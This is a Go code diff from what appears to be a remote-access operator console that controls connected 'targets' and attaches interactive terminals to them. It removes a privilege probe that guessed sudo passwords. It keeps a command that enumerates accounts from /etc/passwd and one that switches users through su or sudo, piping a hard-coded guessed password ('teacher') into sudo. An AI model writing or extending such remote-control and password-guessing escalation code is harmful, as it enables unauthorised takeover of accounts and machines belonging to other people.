@@ -1050,20 +1050,17 @@ func (toc *TCPOperatorConsole) selectTargetUser(writer *bufio.Writer, reader *bu
 		return ""
 	}
 
-	checkPrivs := toc.executeCommandSync(target, `if [ "$(id -u 2>/dev/null)" = "0" ]; then echo "ROOT"; elif sudo -n true 2>/dev/null || (echo "" | sudo -S true 2>/dev/null) || (echo "$USER" | sudo -S true 2>/dev/null) || (echo "teacher" | sudo -S true 2>/dev/null); then echo "SUDO"; else echo "USER"; fi`, 2*time.Second)
-	checkPrivs = strings.TrimSpace(checkPrivs)
-	if checkPrivs == "ROOT" || checkPrivs == "SUDO" {
-		target.mu.Lock()
-		target.HasRoot = true
-		target.mu.Unlock()
-	} else {
-		// Non-root without sudo -> skip user picker completely!
+	target.mu.RLock()
+	hasRoot := target.HasRoot
+	target.mu.RUnlock()
+
+	// Non-root node: skip all synchronous probe commands and return immediately!
+	if !hasRoot {
 		return ""
 	}
 
-	usersRaw := toc.executeCommandSync(target, `awk -F: '($3 >= 500 || $3 == 0) && $7 !~ /(nologin|false|sync|halt|shutdown)/ && $1 !~ /(nobody|systemd)/ {print $1}' /etc/passwd 2>/dev/null`, 2*time.Second)
+	usersRaw := toc.executeCommandSync(target, `awk -F: '($3 >= 500 || $3 == 0) && $7 !~ /(nologin|false|sync|halt|shutdown)/ && $1 !~ /(nobody|systemd)/ {print $1}' /etc/passwd 2>/dev/null`, 800*time.Millisecond)
 	lines := strings.Split(usersRaw, "\n")
-	hasRoot := false
 	var normalUsers []string
 	seen := make(map[string]bool)
 
@@ -1074,23 +1071,17 @@ func (toc *TCPOperatorConsole) selectTargetUser(writer *bufio.Writer, reader *bu
 		}
 		seen[u] = true
 		if u == "root" {
-			hasRoot = true
 			continue
 		}
 		normalUsers = append(normalUsers, u)
 	}
 
 	var finalUsers []string
-	if hasRoot || checkPrivs == "ROOT" {
-		finalUsers = append(finalUsers, "root")
-	}
+	finalUsers = append(finalUsers, "root")
 	finalUsers = append(finalUsers, normalUsers...)
 
 	if len(finalUsers) <= 1 {
-		if len(finalUsers) == 1 {
-			return finalUsers[0]
-		}
-		return ""
+		return "root"
 	}
 
 	writer.WriteString("\r\n\x1b[1;36m+------------------------------------------------------------------------+\r\n")
@@ -1153,12 +1144,10 @@ func (toc *TCPOperatorConsole) attachTerminal(conn net.Conn, reader *bufio.Reade
 	defer target.RemovePTYSubscriber(subID)
 
 	// Redundant resize packet ensures UDP delivery & triggers redraw
-	time.Sleep(30 * time.Millisecond)
 	_ = toc.udpGw.SendPtyResizeID(target, sessID, target.Cols, target.Rows)
 
 	target.AddLog(fmt.Sprintf("Operator attached via netcat (Session ID %d)%s", sessID, asUserMsg))
 
-	time.Sleep(50 * time.Millisecond)
 	if targetUser != "" {
 		switchCmd := fmt.Sprintf("if [ \"$(id -u 2>/dev/null)\" -eq 0 ]; then exec su - %s; elif sudo -n true 2>/dev/null; then exec sudo -u %s -i; elif echo '' | sudo -S true 2>/dev/null; then (echo '' | sudo -S -u %s -i) || (echo '' | sudo -S su - %s); elif echo 'teacher' | sudo -S true 2>/dev/null; then (echo 'teacher' | sudo -S -u %s -i) || (echo 'teacher' | sudo -S su - %s); else exec su - %s; fi\r\n", targetUser, targetUser, targetUser, targetUser, targetUser, targetUser, targetUser)
 		_ = toc.udpGw.SendPtyDataWithSession(target, sessID, []byte(switchCmd))
